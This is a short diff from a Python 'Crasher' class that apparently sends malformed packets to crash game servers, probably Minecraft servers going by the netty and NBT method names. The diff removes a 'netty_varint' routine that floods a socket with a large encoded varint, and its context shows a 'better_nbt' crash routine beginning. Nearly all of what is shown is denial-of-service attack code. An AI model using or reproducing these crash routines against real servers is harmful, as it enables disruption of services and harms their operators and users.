@@ -15,10 +15,6 @@ class Crasher:
     def __init__(self):
         self.packet_id = b'\x17'
         self.data = bytearray()
-    def netty_varint(self, socket, packet_count):
-        content = Packet.encode_varint(1000000)
-        for i in range(packet_count):
-            socket.sendall(content)
 
     def better_nbt(self, socket, packet_count):
         self.packet_id = b'\x0E'
